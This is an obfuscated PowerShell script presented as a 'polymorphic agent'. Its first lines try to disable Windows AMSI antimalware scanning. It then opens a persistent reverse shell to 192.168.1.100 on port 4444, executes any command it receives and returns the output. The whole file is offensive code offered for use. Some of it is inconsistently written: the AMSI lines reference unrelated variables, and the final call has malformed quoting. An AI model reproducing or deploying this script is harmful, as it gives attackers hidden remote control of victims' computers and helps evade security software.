# Polymorphic PowerShell Agent
$ErrorActionPreference = "SilentlyContinue"


$mipodiwosado = [Ref].Assembly.GetType('Sys$(116)$(101)m$(46)Mana$(103)e$(109)e$(110)t.Auto$(109)ation.$(65)ms$(105)Utils')
$h54rd1IEiP = $sebwk_ehtky.GetField('ams$(105)I$(110)itFail$(101)d','NonPublic,Static')
$3m97bk2edx8dv.SetValue($null,$true)


function Enckucofutadiqa {
    param([string]$dtccp_mw)
    $rsgYMoJ3NbFJd = [System.Text.Encoding]::UTF8.GetBytes($dtccp_mw)
    return $rsgYMoJ3NbFJd
}

function Dec56528uj {
    param([byte[]]$dtccp_mw)
    $rsgYMoJ3NbFJd = [System.Text.Encoding]::UTF8.GetString($dtccp_mw)
    return $rsgYMoJ3NbFJd
}

function ConnNsuTUZBT2M {
    param([string]$clcnpe_agzv, [int]$stJKWPIfawcjZW)
    
    while ($true) {
        try {
            $bufxbonU4 = New-Object System.Net.Sockets.TCPClient("192.168.1.100", 4444)
            $dtccp_mw = $bufxbonU4.GetStream()
            
            [byte[]]$rsgYMoJ3NbFJd = 0..65535|%{0}
            
            while (($cmdxl4go0unhj = $dtccp_mw.Read($rsgYMoJ3NbFJd, 0, $rsgYMoJ3NbFJd.Length)) -ne 0) {
                $Execfjbw_tkan_yb = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($rsgYMoJ3NbFJd, 0, $cmdxl4go0unhj)
                
                if ($Execfjbw_tkan_yb.Trim().ToLower() -eq "exit") {
                    break
                }
                
                try {
                    $rsgYMoJ3NbFJd = (Invoke-Expression $Execfjbw_tkan_yb 2>&1 | Out-String)
                } catch {
                    $rsgYMoJ3NbFJd = $_.Exception.Message
                }
                
                $rsgYMoJ3NbFJd = $rsgYMoJ3NbFJd + "PS " + (Get-Location).Path + "> "
                $cmdxl4go0unhj = ([text.encoding]::ASCII).GetBytes($rsgYMoJ3NbFJd)
                $dtccp_mw.Write($cmdxl4go0unhj, 0, $cmdxl4go0unhj.Length)
                $dtccp_mw.Flush()
            }
            
            $dtccp_mw.Close()
            $bufxbonU4.Close()
            break
            
        } catch {
            Start-Sleep -Seconds 32
            continue
        }
    }
}

# Execute
ConnNsuTUZBT2M ""192.168.1.100"" 4444
